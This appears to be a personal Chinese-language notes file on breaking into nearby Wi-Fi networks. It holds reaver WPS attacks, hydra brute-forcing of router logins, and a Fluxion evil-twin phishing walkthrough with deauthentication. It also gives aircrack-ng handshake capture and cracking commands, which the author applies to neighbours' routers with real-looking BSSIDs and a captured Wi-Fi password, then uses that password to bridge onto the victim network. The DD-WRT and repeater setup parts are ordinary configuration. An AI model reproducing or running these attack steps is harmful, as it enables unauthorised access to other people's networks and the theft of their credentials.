60:BB:0C:DB:33:ED   6  -53  1.0  No   ChinaNet-2XSV
BC:D1:77:B3:11:C0   6  -61  1.0  No   TP-LINK_B311C0
8C:21:0A:90:08:AC   6  -59  1.0  No   MERCURY_9008AC
20:DC:E6:41:2A:F4   6  -55  1.0  No   philips
A8:57:4E:A7:47:2C  11  -59  1.0  No   UU
2A:6C:07:D9:6B:F1  13  -65  1.0  No   Xiaomi_6BF0_VIP
D0:60:8C:41:B0:EA   3  -61  1.0  No   ChinaNet-m77z
84:C9:B2:87:AC:8A   6  -63  1.0  No   dlink
EC:88:8F:54:66:60   6  -63  1.0  No   wqs12
EC:88:8F:BB:99:BC   6  -59  1.0  No   FAST_BB99BC
D4:A1:48:92:30:C4   6  -57  1.0  No   appleshi_2.4G
98:BC:57:5F:83:5B  12  -63  1.0  No   ChinaNGB-Ydm93P
98:BC:57:5B:A5:FF  12  -57  1.0  No   ChinaNGB-YdxPch
7C:08:D9:DB:2C:CA   1  -57  1.0  No   ChinaNGB-602
98:F4:28:02:1C:37   1  -57  1.0  No   ChinaNet-NMZp
38:83:45:FD:82:12   1  -63  1.0  No   tingting
98:BC:57:70:62:A9  13  -63  1.0  No   ChinaNGB-YdM7rV
98:BC:57:4E:C4:6E   1  -61  1.0  No   ChinaNGB-YDVa2n
08:C0:21:2E:AE:D4   1  -63  1.0  No   CMCC-i6Eb
C4:C7:55:3D:65:5E   1  -61  1.0  No   ChinaNet-pDQn
7C:08:D9:B2:8E:92   1  -69  1.0  No   ChinaNGB-239309
08:10:7A:28:2E:F6   1  -63  1.0  No   ChinaNet-2.4G-2EF6
C4:C7:55:0F:85:31  11  -63  1.0  No   ChinaNet-9d2f
D4:76:EA:89:F1:CF   2  -59  1.0  No   ChinaNet-EsuN
A8:15:4D:FD:2F:10   6  -65  1.0  No   tang_1003
C8:E7:D8:37:B4:08   1  -65  1.0  No   ADMIN-2401
F0:B4:29:D1:69:C3   3  -65  1.0  No   5G就是它
08:3F:BC:BC:07:EF   5  -61  1.0  No   ChinaNet-cVjp
















































实例2 18:44:E6:73:CA:CF   1  00  1.0  No   ChinaNet-VTka
🔅 reaver -i wlan0mon -b 18:44:E6:73:CA:CF -vv
后面不能加 -a 不知为什么..  开始等吧..




⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️------⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️

🔵 路由器登录密码破解. ✔︎
================================================================================

    成功连接到对方路由后，下面我需要做的就是连接路由的 WEB 管理界面
    首先尝试路由器的默认登录密码!!! 本文就是直接用123456 登录进去了..

    就算对方改了路由器默认登录密码.还是有办法的!!!
    不少路由器厂家.为了后期维护方便.在管理固件中留下后门!! 我们可以利用
    http://routerpwn.com/     这个网站去找对应的路由器品牌.本文不深入这个..



    字典暴力破解 很有效. 一般设置这个都是非常常用的密码.
    暴力破解 最好确定对方的用户名..  不然组合太多了.



    🔸 端口扫描工具 查找路由器的网页端口.

        一.扫描路由器端口为了路由器的安全，网管通常都会将路由器的默认端口(80)给更改掉，
        所以我们破解路由器密码的第一步就是必须要找到路由器的wEB管理端口。 　　
        如果路由器上的UPnP(通用即插即用，是一组协议的统称)功能是开启的(通常路由器默认情况下UPnP都是开启的)，
        那么路由器一定会开放一个1900端口。 有这个端口的 那肯定就是路由器了.

        一般肯定是80端口的.
        ✘✘∙𝒗 Desktop nmap 192.168.11.1
            Starting Nmap 7.25BETA1 ( https://nmap.org ) at 2017-05-05 08:12 CST
            Nmap scan report for 192.168.11.1
            Host is up (0.0033s latency).
            Not shown: 998 filtered ports
            PORT     STATE SERVICE
            80/tcp   open  http
            1900/tcp open  upnp


    🔸 简单破解:
        一般要破解两个东西. 用户名 和 密码.
        个别路由器只要破解一个密码就可以了. 如水星的.. 直接输入123456 就进去了....


        (1)管理员帐号密码是出厂值，就直接试下几个常用初始帐号密码。
        例如：“admin、admin";"root、root";"user、user";“admin、password”，
        但如果是管理员用户名和密码已经修改过了，那就要去破解了。


    🔸 暴力破解.
        参考 hydra.txt   这个可以爆破 ssh、mysql、web登录页面 等等...

        hydra -s 80 -l admin -P /root/Desktop/rockyou.txt 192.168.11.2 http-get /admin/
                -s 80 是指定目标端口.
                -l admin 指定用admin 做对方账户.
                -P /root/Desktop/rockyou.txt 指定密码字典. 会尝试里面的每一个密码.
                http-get   目标的攻击方法.
                /admin/    这个必须有. 原因未知!!!!!

                一般几分钟就能跑出来密码.


















⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️--DDWrt 刷机---⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️

❤️  6300v2 刷DDwrt.
================================================================================


    Netgear 默认不支持wpa2加密方式的中继.只能先刷机.
    参考教程 https://www.chiphell.com/thread-957807-1-1.html

🔵  R6300v2 版本
================================================================================

    其实有两个版本的.硬件虽然一模一样.但是刷机时候固件有区别!!!  
        普通版本 R6300v2  
        定制版本 R6300v2CH (Charter ISP)

        👁‍🗨 版本判断方法1: 路由器正面 底边的颜色.  黄色的是普通版本!!! 蓝色的是定制版本!!!

        👁‍🗨 版本判断方法2: 路由器网页管理界面 ➜ 高级 ➜ 管理 ➜ 路由器状态 ➜ 路由器信息 ➜ 查看固件版本: 
            普通版是: V1.0.2.33_1.0.35
            定制版是: V1.0.2.33_1.0.35CH   里面有ch就是定制版.

    🔸 定制版本(美版) 
        默认wifi名一般是MyCharterWiFixx 
        固件版本号后面带“CH”，不能刷普通官方固件，刷DD必须用kong大的CH版专用固件
        无线设置 ➜ 地区 只能选择美国. 不像普通版全球都能选的.

    🔸 普通版本
       默认的wifi名称一般是：NETGEARxx


🔵 固件下载
================================================================================

    🔸 固件格式
        固件有两种格式: CHK BIN
            Chk 是主要固件.一般用于原生固件 刷 ddwrt 时候使用
            Bin 相当于固件更新.刷了dd之后. 升级用的.

    🔸 固件版本
        R6300V2的DD固件主流的大致有三个版本——
            1、Brain大，资深，DDWRT德国人团队里的老大；
            2、DDWRT官方，为R6300V2专门发布的固件；
            3、Kong大，此乃大神不解释，特色是固件版本更新和他的情绪变化一样快..
                我的最终选择是大名鼎鼎的Kong大

    🔸 Kong 固件下载地址:  http://www.desipro.de/ddwrt/K3-AC-Arm/
 
    🔸下载主要固件: dd-wrt.k3_r6300v2.chk 
        👁‍🗨 注意 如果你的6300是 定制版本的.那就下载dd-wrt.k3_r6300v2ch.chk 

    🔸下载更新固件: dd-wrt.v24-K3_AC_ARM_STD.bin


🔵 刷机步骤
================================================================================

    🔸 刷回原厂固件

        刷任何非官方固件之前，请先刷回原厂固件再恢复出厂设置!!!!！
        刷任何非官方固件之前，请先刷回原厂固件再恢复出厂设置!!!!！
        刷任何非官方固件之前，请先刷回原厂固件再恢复出厂设置!!!!！

        别直接从DD刷到TT之类的··不然会很麻烦··！！

        ❗️️❗️❗️R6300V2原厂固件 http://www.downloads.netgear.com/files/GDC/R6300V2/R6300v2-V1.0.4.2_10.0.74.zip
        如果升级到别的dd固件遇到问题 就刷这个原厂固件可以!!! 
        刷完这个固件后netgear的固件版本是 v1.0.4了 原来是V1.0.2.33


            👹 此固件文件不正确！请再次获取固件文件，确定是用于此产品的正确固件。
                如果你不刷回原厂固件.很有可能遇到这个问题.解决办法就是刷回原厂固件.
                必须是原厂的.直接去netgear官网去下载!!!!


            🔸 恢复出厂设置: 
                开机 & 路由器背面reset按钮 按10秒+ 就可以了

                如果你之前刷过别的固件 必须先刷回netgear官方默认的固件.
                如果原来就是netgear默认固件. 那么恢复出产设置后再刷ddwrt!

            🔸 恢复出产设置2
                web界面 ➜ 高级 ➜ 管理 ➜ 备份设置 ➜ 恢复出产设置.


    🔸 刷ddwrt chk主要固件
        用网线或者无线 把电脑连接到路由器. 然后登录 192.168.1.1  admin/password
        在网件的固件升级界面(高级➜ 管理➜ 路由器升级)里浏览下载的DD的chk固件（dd-wrt.K3_R6300V2.chk），然后上传

    🔸 更改中文界面
        更改DDWRT的界面语言，Administration下面Language Selection找到Chinese Simplified，保存；

    🔸 刷ddwrt 更新包.
        在DDWRT的固件管理里，导入dd-wrt.v24-K3_AC_ARM_STD.bin文件，升级。完成后重启，再设置自己的WAN和LAN等，完毕。
        PS：刷完BIN文件才为完整版的DDWRT。然后就可以来设置 wifi中继了.







⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️--无线中继---⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️

🔸 WDS  
         WDS (Wireless Distribution System)无线分布式系统，是无线连接两个接入点（AP）的协议
    ❗️❗️❗️ 中继只要知道主路由器的各种设置参数就可以. 不需要设置WDS,忘了wds. 只会干扰你思路.❗️❗️❗️
    ❗️❗️❗️ 中继只要知道主路由器的各种设置参数就可以. 不需要设置WDS,忘了wds. 只会干扰你思路.❗️❗️❗️
    ❗️❗️❗️ 中继只要知道主路由器的各种设置参数就可以. 不需要设置WDS,忘了wds. 只会干扰你思路.❗️❗️❗️


🔵 无线模式
================================================================================

    dd-wrt的六种无线模式，看了再也不会稀里糊涂了。

    1. 访问点 (AP)
        该模式下路由器的无线网卡就像一个”无线HUB”，负责建立无线路由器和电脑之间的数据链路（相当于无形的网线）。正常情况下，家用的无线路由器的无线连接都默认工作在此模式下。

    2. 客户端 (Client)
        像笔记本电脑上的无线网卡那样工作，仅连接其它的无线网络，而不发射自己的无线网络信号。对于无线路由器来说，这种模式相当于启用了一个无线的WAN口，且下面的电脑只能通过有线方式接到此设备。该模式下无线路由器仍然提供DHCP及NAT功能，内部四个LAN口组成的单独IP地址段局域网，通过无线路由器上自己的网关，连上外部主网络。

    3. 客户端网桥 (Client Bridge)
        和“客户端”模式一样，相当于启用了一个无线的WAN口，且下面的电脑只能通过有线方式接到此设备。不过，内部的LAN口组成的局域网和连接上的无线网段处于相同的IP地址段。内部的DHCP请求也会被转发到主无线网络上。

    4. AdhocAdhoc
        有个形象的比喻，就像是将两台电脑之间直接找根网线连起来，只不过在这里这根网线是个无线的。最常见的使用adhoc连接的设备多数是一些手持游戏机。该模式在无线路由器上使用的场合比较罕见。

    5. 中继 (Repeater)
        顾名思义，中继就是一边是接受信号，一边又发射自己的无线信号。
        在这种模式下无线路由器以无线网卡客户身份接入主AP，然后再以新增虚拟界面(Virtual Interfaces)来为客户端提供无线接入。
        该模式的最大意义在于可以解决无线信号受到距离或者障碍物的影响不能传输到更远的问题。这种模式下无线路由器仍然提供DHCP及NAT功能，即所有的内部LAN口以及无线客户接入组成的是一个单独的局域网网段。

    6. 中继桥接 (Repeater Bridge)
        和”中继”模式一样，可以解决无线信号受到距离或者障碍物的影响不能传输到更远的问题。
        不过，接入到该无线路由器上的电脑终端，是和主无线网网络处在相同的IP地址段。内部的DHCP请求，也会被转发到主无线网络上。
        
    总结：
        正常情况下，无线路由器工作在“AP”模式下。没有特殊需求的人别去折腾它。一般也就用的上中继(Repeater) 和 中继桥接(Repeater Bridge) 这两个模式.

        网上大多数采用的都是 Repeater 模式，但使用这个模式后，中继无线路由器下的网络是独立的，和主无线网络是不能直接互访的。
        其实，我们可以采用 Repeater Bridge 模式，在此模式下，中继无线路由器下的网络和主网络是在一起的。

        如果已有的无线路由器和笔记本电脑之间隔的墙壁太多（比如想和邻居家共享上网），可能会碰到窗子附近信号还可以，而房间里面信号太弱的情况。
            这时候，再买一台dd-wrt路由器，设置成“中继”的方式就可以解决信号传输距离不足的问题。至于选择“中继”还是”中继桥接”，就要看自己的需求了。
                例如被中继的网络也是自己家的，那么建议使用“中继桥接”。这样可以使所有的电脑都在同一网段，互访起来比较方便。
                如果想自己另建一个独立的网段来提高安全性，那就选“中继”模式吧。
                   👁‍🗨 一般来说，如果网络术语里面的带有”桥(bridge)”字眼，多数是指在两个网络在数据链路层面被连接起来，都处在同一个IP局域网内。

        ❗️❗️❗️中继模式只有一个SSID，而桥接模式每个路由器都有一个独立的SSID，且可以分别设置密码❗️❗️❗️
        ❗️❗️❗️中继模式只有一个SSID，而桥接模式每个路由器都有一个独立的SSID，且可以分别设置密码❗️❗️❗️
        ❗️❗️❗️中继模式只有一个SSID，而桥接模式每个路由器都有一个独立的SSID，且可以分别设置密码❗️❗️❗️





❤️ 无线中继桥接
================================================================================

    🔵 基础知识
        Netgear 默认只能进行wep加密方式的中继桥接,  不支持wpa加密方式的桥接的!!所以要刷 ddwrt 来支持wpa加密方式的中继桥接.

        ❗️中继桥接 = 中继 + 桥接
            中继: 两路由器的 SSID、信道、频段带宽、加密方式、加密算法、密码、都必须一样才能实现中继.
            桥接: 就是把两个路由器分到一个网断里面去.也就是主路由器的网段. 
            
            👁‍🗨 如果只中继不桥接那么 两个路由器的网段是不同的! 也就是两个路由器下的设备不能实现互相访问.
            👁‍🗨 信道:  必须首先将主路由器的频道/信道改为固定的数值, 不要使用自动!!!


    🔵 网络环境
        2台无线路由器，
            主要无线路由器默认IP 是 192.168.11.1 
            中继无线路由器默认IP 是 192.168.1.1                     



    🔵 主路由器信息

        对方路由器的配置信息很重要. 中继路由器各种设置是根据主路由器的设置来的.

        SSID: MERCURY_210
        信道: 9              👁‍🗨 要用无线中继必须选择固定信道. 如果是自动的那就手动选一个信道.
        模式: 11bgn mixed
        频段带宽: 20MHz

        加密方式: wpa-psk/wpa2-psk
        认证类型: 自动
        加密算法: AES
        PSK 密码: njs236121


    
    🔵 中继路由器.
        主要设置都在中继路由器上进行. 主路由器什么都不用设置!只要指定信道就可以了!!!
        👁‍🗨 恢复出厂设置: 管理 ➜ 出厂预设值 ➜ 恢复出厂设置

    🔸 更改登录帐号密码 (可选)
    🔸 设置中文界面     (可选)

    🔸 5G 设置
        改 5G ssid 默认2.4g、5g的ssid名都是 ddwrt, 容易混淆.5g的ssid名改成 dd-wrt-5G
        改 5G 密码: 无线 ➜ 无线安全 ➜ 

    🔸 2.4G 中继设置 - ssid相关
        ddwrt ➜ 无线 ➜ 基本设置 ➜  无线物理接口2.4g ➜ 
        
            无线模式:     中继桥接
            无线网络模式: 混合
            SSID:         MERCURY_210
            无线频道:     9
            频道宽度:     20

        然后点击应用. 不是保存

    🔸 2.4G 中继设置 - 无线密码设置
        ❗️❗️❗️这里是设置 必须和主路由器的设置一模一样!❗️❗️❗️
        ❗️❗️❗️这里是设置 必须和主路由器的设置一模一样!❗️❗️❗️

        2.4G物理接口的无线安全设置:
        安全模式: wpa2 personal
        wpa算法: AES
        wpa密钥: njs236121
        然后应用..

    🔸 2.4G 添加虚拟接口

        2.4g下 ➜ 虚拟接口 ➜ 添加 ➜ 
        SSID: DDwrt-Bridge  
        ap独立 必须开启 2.4g的 wifi才能用!!!
        其余全部默认
        然后重启下路由器, 现在 2.4G和5G wifi应该都能用了

        👹 这个虚拟接口不能删除. 不然好像5G的也上不去网. 留着吧.



    🔸 连接测试

        这里中继桥接就差不多完成!! 手动断开网线重连中继路由器. 
        你就会发现....中继路由器 分配出来的ip地址 变成... 192.168.11.105   变成了主路由器的网段了....
        说明已经连上对方的路由器了.
        用网线连 中继路由器的Lan口 可以直接上网了!
        用无线连 中继路由器的 DDwrt-5g 也可以用


    🔸 设置中继路由器IP

        你会发现...  中继路由器的web界面没有了...虽然有线和5g的无线能上网.但是2.4g的无线不能.
        中继路由器的默认IP地址是 192.168.1.1 
        我们现在获得的IP地址是 192.168.11.1 
        两个ip 根本不在一个网段内. 你是不可能连上 192.168.1.1的
        办法就是 手动设置电脑IP. 成 192.168.1.1网段的. 如
            ip: 192.168.1.11
            掩码: 255.255.255.0
            路由器: 192.168.1.1
        现在浏览器再输入 192.168.1.1 就进入ddwrt的界面了.
        把 ddwrt 的路由器ip 改成 192.168.11.2 吧... 
        以后要进入ddwrt的设置界面就不用手动设置ip这么麻烦了.
        然后记得把电脑ip重新设置成自动获取.
        现在 浏览器用 192.168.11.2 就可以进入 ddwrt的界面了.









⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️--Wifi 信号分析----⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️
万事俱备.就差中继路由器的摆放位置了.

安装无线网络并不是一直很简单的事情。
邻居的网络干扰，来自于其他电子设备的无线杂音等都会引起严重的连接问题，出现错误，
您不得不一遍又一遍的尝试，现在，有一个更好的解决方式：NetSpot会帮助您完成这些工作！

位置非常非常只要. 好的位置有1M+的网速. 查的位置几KB 甚至连不上...
这就需要 wifi 信号分析仪器了. 
我这里只说Mac的软件..win的自己谷歌吧..

🔵  netspot 扫描器

    首先官网安装免费版本的 netspot 扫描器

🔵 NetSpot WiFi Reporter
    下载链接 http://xclient.info/s/netspot-wifi-reporter.html#history_versions
    为免费的NetSpot WiFi 扫描器 增加了先进的可视化及强大的报告功能。新的可视化热图包括：

    频率波段覆盖
    PHY模式覆盖
    无线传输速率
    下载/上传速度
    无线网络故障排除

    NetSpot WiFi Reporter 特性：

    支持802.11 a/b/g/n/ac WiFi标准，支持2.4GHz + 5GHz双频段
    为您的测量工程提供高级可自定义的导出功能
    不限数量的可同时观测的接入点
    超级灵活的分组，可根据接入点的SSID、频道等分组，再加上自定义的分组，高效便捷
    通过自定义别名更好的管理接入点
    非常便捷的检测您无线网络的问题区域，并提供解决建议
    无需专业背景知识：简单、快速的无线数据分析
    NetSpot WiFi Reporter 是最佳的网络分析、优化工具，无论是专业人员还是家庭用户都是不二之选

    其他NetSpot WiFi Reporter特性(NetSpot扫描器是必要的):

    活动无线的实地勘测并带有功能全面的互联网下载和上传速度
    隐藏网络发现及扫描
    可配置的测量自动保存
    热图上的接入点自动预测性定位
    收集所有相关网络的详细参数


🔵 使用方法
    首先包着笔记本. 开着这个软件. 去找 信号最强的位置..

    最后发现... 2.4G的比5G的快多了. 不知为什么..














⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️--Fluxion 破解---⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️

🔵 简介
    可以迅速帮你检查所需要的插件并进行安装,在短时间内搭建出一个完整的钓鱼环境。
    而且在新版中增加了对中文的支持，这是国外好多安全工具没有的。

🔵 工作原理（大体步骤）

　　1.扫描周围WIFI信号
　　2.抓取握手包(这一步的目的是为了之后验证WiFi密码是否正确)
　　3.使用WEB管理界面
　　4.启动一个假的AP实例来模拟真的AP
　　5.会生成一个MDK3进程。该进程会取消对连接到目标网络的所有用户的认证，可以诱使他们连接到FakeAP并输入WPA密码。
　　6.启动伪DNS服务器以捕获所有DNS请求并将它们重定向到运行攻击脚本的主机.
　　7.随后会弹出一个窗口提示用户输入正确的WiFi密码
　　8.用户输入的密码将和第二步抓到的握手包做比较来核实密码是否正确
　　9.一旦提交正确的密码，攻击将自动终止.这个程序是自动化运行的，并且能够很快的抓取到WiFi密码


🔵 fluxion 最新地址:   https://github.com/wi-fi-analyzer/fluxion


🔵 安装依赖 & 启动:
    👁‍🗨 fluxion目录下有一个‘Installer.sh’脚本文件，运行后会自动更新或安装缺少的工具。

    apt-get install git

    git clone https://github.com/Xu-Jian/fluxion
    cd fluxion && ls
    ./fluxion



git clone https://github.com/FluxionNetwork/fluxion
这个是官网的. 有时候下载不了. 最新版本 最好翻墙去这里下!!!


    这里的命令 不能在ssh中执行.需要到虚拟机中去..

    运行这个 ./fluxion首先检测软件的所需依赖.
    没安装的 就去安装!!!! 如:
    🔸Dhcpd
        apt-get update
        apt-get dist-upgrade
        apt-get install isc-dhcp-server -y

    🔸Hostapd
      sudo apt-get install hostapd dnsmasq

    🔸lighttpd
      sudo apt-get install lighttpd

    🔸php5-cgi
      ❗️❗️❗️❗️ apt-get install php-cgi
      不要用   apt-get install php5-cgi
      
      kali 2016 默认用的是 php7 不是php5 .
      这里安装 php-cgi 就可以了.


🔵 选择语言 ➜ 6 
🔵 选择网卡 ➜ 1     网卡的话需要大家自己分辨，但是信道选项一般都是选择第一个 
🔵 选择信道 ➜ 1     
    选择完后它会对网卡周围的WiFi进行扫描，扫描到你要破解的WiFi后按Ctrl+C停止。

    👹 这里会中文乱码..

      locale -a 查看当前系统支持的字符集。

      解决策略：
      （以下 的步骤中，可能有冗余的地方，毕竟是自己亲自摸索的，有些地方还是有些不大确定。）
      1.在命令行输入”dpkg-reconfigure locales”。进入图形化界面之后，（空格是选择，Tab是切换，*是选中），选中en_US.UTF-8和zh_CN.UTF-8，确定后，将en_US.UTF-8选为默认。
      2.安装中文字体，”apt-get install xfonts-intl-chinese “和” apt-get install ttf-wqy-microhei”
      3.重启
      4.这时发现网页不乱码，系统也不乱码，但是是英文的界面。打开系统设置，找到设置语言的地方，将语言再改为汉语（中国），再重启。
      5.这时发现系统又变为中文的界面了。


🔵  ctrl c  然后选择一个目标 wifi   

🔵 选择目标后 出现WIFI的基本信息及攻击选项 选择‘1 伪装AP’

🔵 输入握手包存放路径 我们按回车使用默认路径


🔵 选择抓取握手包的工具 我们选择第一个 aircrack-ag套件

🔵 选择攻击方式 我们选择‘1’对所有目标发起deauthentication攻击
    mdk3 攻击方式参考 http://ixuehua.blog.163.com/blog/static/25995203820163285235464/


🔵 出现两个窗口，
一个是deauthentication攻击，此时连在目标路由器的客户端会强制解除验证解除连接掉线；
另一个是aircrack等待抓取握手包，客户端在掉线后重新连接时会抓取握手包。
当在aircrack窗口出现WPA handshake时证明已经抓到握手包，
然后我们选择‘1 检查握手包’

🔵 选择获取密码的方式，
第一种 web注入 也是我们今天只要介绍的 
第二种跑包（暴力破解）之前的文章已经说过 这里我们选泽‘1’



🔵 选择web页面语言，
包括了大部分路由器品牌的页面，
当然我们也可以根据自己的需要在 /fluxion/Sites/ 修改页面。本次演示我们选择7 中文通用页面

这时fluxion会调用多个工具对原有路由器进行攻击，并迫使客户端连接到我们伪造的ap中，
同时对dns进行欺骗将客户端流量转到我们的钓鱼页面


手机会断开原来的wifi 并连接到我们伪造的ap 并弹出认证页面 
由于对dns进行了转发，所以即时关闭认证页面 只要打开任意页面都会转到到这


这时只要用户打开浏览器，就会转到输入WiFi密码的页面。


在通过对比密码正确后，fluxion会关闭伪造的ap 使客户端重新连接到原来的ap 并给出ap密码 退出程序


有问题. 明明密码对的也 提示不对..
试试 其他语言的就可以了...

这里是不会劫持 https网站的.只对http网站有效.



👁‍🗨 最后的钓鱼界面. 
1 有问题!!!
2 netgear 可用.
3 也可用..











⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️--字典破解----⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️

🔵 airmon-ng               查看是否支持监控模式  
🔵 airmon-ng start wlan0   开启监控模式. 现在用ifconfig 会发现 wlan0 变成 wlan0mon了.
🔵 airodump-ng wlan0mon    查看周围wifi详细信息
    ❗️ 记住要破解wifi的信道和BSSID (也就是路由器的Mac地址);   按Ctrl-C结束.

🔵 airodump-ng -c 3 --bssid 6c:b0:ce:bd:d1:5b -w ~/ wlan0mon   选择一个wifi来抓握手包
      -c      对方wifi 信道
      --bssid 对方wiif bssid
      -w      抓包数据的保存位置

      Station 下面的就是连接的用户...  记住一个用户的mac地址.
      用下面马上介绍的攻击命令来使得这个用户重新连接路由器. 这样就能快速获取握手包了.

🔵 强制某设备重连路由器.
    👁‍🗨 这里注意  要新开一个终端来执行下面命令.现在还不能停止上面的抓包...
    aireplay-ng -0 2 -a 6c:b0:ce:bd:d1:5b -c dc:37:14:16:d2:79 wlan0mon
      -0 表示发起攻击 
       2 好像是攻击次数.不管.
      -a 指定无线路由器BSSID
      -c 指定强制断开的设备

      这里如果你用这个命令攻击自己的手机. 
      这时候去看手机就会发现wifi断开几秒 然后重连了.说明这个攻击命令有有效的.
      手机重连后等几秒就能在 上一步的第一行就

      ❗️❗️ 如果获取了握手包.
      CH  6 ][ Elapsed: 3 mins ][ 2017-04-26 07:55
      这行会变成类似... 多出个 handshake 来.这时候就说明抓到握手包了.可以停止抓包了.
      CH  3 ][ Elapsed: 42 s ][ 2017-04-26 07:56 ][ WPA handshake: 6C:B0:CE:BD:D1:5B

🔵 抓包文件
    🔅 cd ~
    🔅 ls -l
        total 332
        -rw-r--r-- 1 root root 293246 Apr 26 07:32 -01.cap
        -rw-r--r-- 1 root root    568 Apr 26 07:32 -01.csv
        -rw-r--r-- 1 root root    584 Apr 26 07:32 -01.kismet.csv
        -rw-r--r-- 1 root root   3786 Apr 26 07:32 -01.kismet.netxml

        好几个文件. 主要就是 .cap 文件.
        每次抓包都会自动给你重命名. -01.cap ; -02.cap ; -03.cap... 等等.方便你区分.

🔵 结束监听模式
    airmon-ng stop wlan0mon

🔵 准备字典

    Kali Linux自带的rockyou字典:  cd /usr/share/wordlists/rockyou.txt.gz
    解压后才能用：                gzip -d /usr/share/wordlists/rockyou.txt.gz

    cd /usr/share/wordlists/rockyou.txt
    这文件很大的 11111111 88888888 都在里面.说明这个字典还是不错的.

🔵 破解(VM Kali):

    sudo aircrack-ng -a2 -b 6C:B0:CE:BD:D1:5B -w /usr/share/wordlists/rockyou.txt /root/-01.cap
        -a2 不管.
        -b 后面是 路由器Mac地址.
        -w 后面是 字典路径
        /root/-01.cap 是 .cap 文件路径

🔵 破解(Mac): 复杂密码字典 (22万条.3MB大小文件. 真实密码在文件尾部.)
    👁‍🗨 22万条密码.两分钟也就跑完了. 很快的. 重点是密码字典!!!
    sudo aircrack-ng -w /Users/v/Desktop/dic/cain.txt -b 6c:b0:ce:bd:d1:5b /tmp/airportSniffCd2nGz.cap
        -b 后面是 路由器Mac地址.
        -w 后面是 字典路径



❤️ 密码字典

    重点的重点就是字典! 字典里面有对方密码. 就能找出那个密码.

    好的密码字典一个，应包含常见的弱密码、手机号、姓名生日组合、各大网站泄露的密码、英语单词等等。
    如果使用字典破解不了，说明密码还算复杂；暴力穷举更是费时费力。（论复杂密码的重要性）。

    淘宝好像有跑字典服务???
    用GPU跑字典. 快很多很多..

⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️---字典破解实战---⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️
 之前是自己的路由器来试验.下面来试试别人的路由器.
 用密码字典来暴力破解成功率最主要就是看你的字典. 还有就是对方密码复杂度..
 没事别用这个.... 成功率低!!!

🔵 airmon-ng start wlan0   ➜ 进入监听模式 

🔵 airodump-ng wlan0mon    ➜ Kali 查看周围 wifi

    CH  1 ][ Elapsed: 12 s ][ 2017-04-26 07:48

    BSSID              PWR  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID

    8C:A6:DF:DE:5E:0C  -84        2        0    0   6  54e. WPA2 CCMP   PSK  TP-LINK_5E0C
    BC:5F:F6:0A:F6:68  -88        2        0    0   6  54e. WPA2 CCMP   PSK  MERCURY_F668
    1C:60:DE:AE:DB:BE  -90        1        0    0   6  54e. WPA2 CCMP   PSK  MERCURY_DBBE302
    F0:B4:29:21:07:A5  -90        2        0    0  11  54e  WPA2 CCMP   PSK  G-family
    6C:B0:CE:BD:D1:5B  -27       14        0    0   3  54e  WPA2 CCMP   PSK  219
    E4:F3:F5:83:CF:00  -67       12       10    0  12  54e  WPA2 CCMP   PSK  MERCURY_CF00
    C8:3A:35:FD:E1:98  -69       14        0    0   9  54e  WPA2 CCMP   PSK  Tenda_FDE198
    00:6B:8E:51:93:E4  -68        3        0    0   1  54e  WPA2 CCMP   PSK  PHICOMM_5193E4
    E4:D3:32:B4:83:BC  -73       12        0    0  11  54e. WPA2 CCMP   PSK  MERCURY_210
    30:FC:68:47:C0:42  -77        8        0    0  11  54e. WPA2 CCMP   PSK  顿�.��.海�.�
    B8:F8:83:ED:CF:9B  -70       10        0    0  11  54e. WPA2 CCMP   PSK  TP-LINK_CF9B
    18:44:E6:73:CA:CF  -75        9        0    0   2  54e  WPA2 CCMP   PSK  ChinaNet-VTka
    CC:81:DA:12:0A:18  -72       11        0    0   4  54e  WPA2 CCMP   PSK  @PHICOMM_10
    30:FC:68:3D:58:92  -75        8        0    0   6  54e. WPA2 CCMP   PSK  �.��..�.�.你�.�.�.�
    14:75:90:08:4D:5E  -79        5        0    0   6  54e. WPA2 CCMP   PSK  lys
    CC:2D:21:2F:FF:40  -79        7        0    0  11  54e  WPA2 CCMP   PSK  Tenda_2FFF40
    42:FC:68:3D:58:92  -75        5        0    0   6  54e. WPA2 CCMP   PSK  �..�..你�.�.�.�.
    00:6B:8E:E0:8F:58  -81        5        0    0   9  54e  WPA2 CCMP   PSK  MYY520MYY
    E4:F3:F5:9A:EF:B0  -81        3        0    0  13  54e  WPA2 CCMP   PSK  MERCURY_EFB0
    5C:63:BF:FE:8A:B8  -81        2        0    0   9  54e. WPA2 CCMP   PSK  ChinaNet-8AB8
    D8:C8:E9:32:07:00  -81        5        0    0  13  54e. WPA2 CCMP   PSK  KEDU
    D8:49:0B:A7:47:F0  -81        5        0    0   2  54e  WPA2 CCMP   PSK  ChinaNet-Ccfr
